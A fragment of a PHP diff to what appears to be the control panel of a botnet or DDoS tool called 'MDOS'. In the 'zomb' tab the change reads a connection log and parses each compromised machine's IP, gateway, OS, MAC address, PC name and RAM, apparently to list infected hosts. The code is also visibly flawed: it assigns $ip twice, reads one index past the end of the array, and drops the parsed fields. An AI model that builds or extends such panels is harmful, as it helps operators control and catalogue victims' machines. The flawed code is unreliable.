@@ -48,43 +48,33 @@ if ((isset ($_GET["log"])) and (isset ($_GET["sid"])) and (isset ($_GET["tab"]))
 					MDOS::HTMLPrintUser ($info_sid, $info_log, $info_tab);
 				break;
 				case "zomb":
-					$logdata = file ("task/rawlog/rawlog.txt");
+					$logdata = file ("task/connexions/connectdumper.log");
 						if ($logdata != false) {
 							global $htmdat;
 							for($i=count($logdata);$i>0;$i--){
 								$data = $logdata[$i];
-								list($date, $type, $ip, $error) = explode("|", $data);
-								switch ($type) {
-									case "#0":
-										$htmdat .= '<div class = "lowlevel">&nbsp;<font face = "Arial" size = "4" color ="#EEEEEE">'.$ip.'</font>&nbsp;&nbsp;&nbsp;<font face ="Arial Black" size = "4">'.$date.'</font>&nbsp;&nbsp;<font face = "Arial" size = "4">'.$error.'</font></div>';
-									break;
-									case "#1":
-										$htmdat .= '<div class = "midlevel">&nbsp;<font face = "Arial" size = "4" color ="#EEEEEE">'.$ip.'</font>&nbsp;&nbsp;&nbsp;<font face ="Arial Black" size = "4">'.$date.'</font>&nbsp;&nbsp;<font face = "Arial" size = "4">'.$error.'</font></div>';
-									break;
-									case "#2":
-										$htmdat .= '<div class = "highlevel">&nbsp;<font face = "Arial" size = "4" color ="#EEEEEE">'.$ip.'</font>&nbsp;&nbsp;&nbsp;<font face ="Arial Black" size = "4">'.$date.'</font>&nbsp;&nbsp;<font face = "Arial" size = "4">'.$error.'</font></div>';
-									break;
-								}
+								list($ip, $lang, $localgateway, $os, $macadr, $archetype, $pcname, $ram, $ip, $sid) = explode("|", $data);
+								$htmdat .= '<div class = "zombbar"></div>';
 							}
 						}
-					MDOS::HTMLPrintUser ($info_sid, $info_log, $info_tab);
+					MDOS::HTMLPrintUser ($info_sid, $info_log, $info_tab, $htmdat);
 				break;
 			}
 		}
 		else {
-			MDOS::WriteLog ($_SERVER['REMOTE_ADDR'], '#1', 'CSRF MDOS attack attempt OR expired session. (a bad secure id given on user page)');
+			MDOS::WriteLog ((MDOS::RetrieveIP()), '#1', 'CSRF MDOS attack attempt OR expired session. (a bad secure id given on user page)');
 			MDOS::SecureRedirect($url.'index.php?session=0');
 			exit;
 		}
 	}
 	else {
-		MDOS::WriteLog ($_SERVER['REMOTE_ADDR'], '#2', 'CSRF MDOS attack attempt. (a bad log given on user page)');
+		MDOS::WriteLog ((MDOS::RetrieveIP()), '#2', 'CSRF MDOS attack attempt. (a bad log given on user page)');
 		MDOS::SecureRedirect ($url);
 		exit;
 	}
 }
 else {
-		MDOS::WriteLog ($_SERVER['REMOTE_ADDR'], '#1', 'CSRF MDOS attack attempt. (no parameters calling user page)');
+		MDOS::WriteLog ((MDOS::RetrieveIP()), '#1', 'CSRF MDOS attack attempt. (no parameters calling user page)');
 		MDOS::SecureRedirect ($url);
 		exit;
 }
